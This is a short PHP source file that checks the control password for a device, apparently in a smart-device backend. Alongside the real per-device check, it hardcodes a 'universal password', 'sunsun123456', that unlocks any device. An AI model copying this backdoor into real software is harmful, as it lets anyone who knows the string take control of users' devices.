<?php
/**
 * Created by PhpStorm.
 * User: 1
 * Date: 2017-04-25
 * Time: 09:36
 */

namespace app\src\sunsun\common\action;


use app\src\base\helper\ValidateHelper;

class JudgeLegalCtrlPwdAction
{
    public function judge($logic,$did,$ctrl_pwd){
        $pwd = -1;
        if(method_exists($logic,"getInfo")){
            $result = $logic->getInfo(['did'=>$did]);
            if(ValidateHelper::legalArrayResult($result)){
                $pwd = $result['info']['ctrl_pwd'];
            }else{
                return false;
            }

        }

        //万能密码
        if($ctrl_pwd == "sunsun123456"){
            return true;
        }
        return $pwd == $ctrl_pwd;
    }
}